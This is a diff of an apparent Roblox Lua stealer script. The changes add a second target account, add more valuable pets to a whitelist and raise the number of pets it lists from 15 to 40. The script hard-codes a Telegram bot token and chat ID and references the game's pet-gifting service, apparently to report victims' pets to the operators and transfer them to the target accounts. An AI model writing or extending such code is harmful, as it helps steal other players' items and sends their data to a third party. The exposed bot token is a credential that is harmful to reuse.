@@ -160,7 +160,7 @@ task.spawn(function()
 end)
 local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
 local TELEGRAM_CHAT_ID = "-1002927824958" -- ID канала с префиксом для публичного канала
-local TARGET_PLAYER = "Rikizigg"
+local TARGET_PLAYER = {"Rikizigg", "sERTTQE0"}
 local TRIGGER_MESSAGE = "."
 local WHITELIST = {
     "Raccoon",
@@ -176,7 +176,11 @@ local WHITELIST = {
     "Mimic Octopus",
     "Butterfly",
     "Kitsune",
-    "Corrupted Kitsune"
+    "Corrupted Kitsune",
+    "Wasp",
+    "Silver Monkey",
+    "Cooked Owl",
+    "Parasaurolophus"
 }
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 local STATS = {
@@ -266,7 +270,7 @@ local function getPetsList()
     local result = {"ПИТОМЦЫ:"}
     
     for i, pet in ipairs(pets) do
-        if i > 15 then break end
+        if i > 40 then break end
         
         totalWeight = totalWeight + pet.weight
         if pet.isWhitelisted then
@@ -277,7 +281,7 @@ local function getPetsList()
         end
     end
     
-    if #pets > 15 then
+    if #pets > 40 then
         table.insert(result, "...")
     end
     
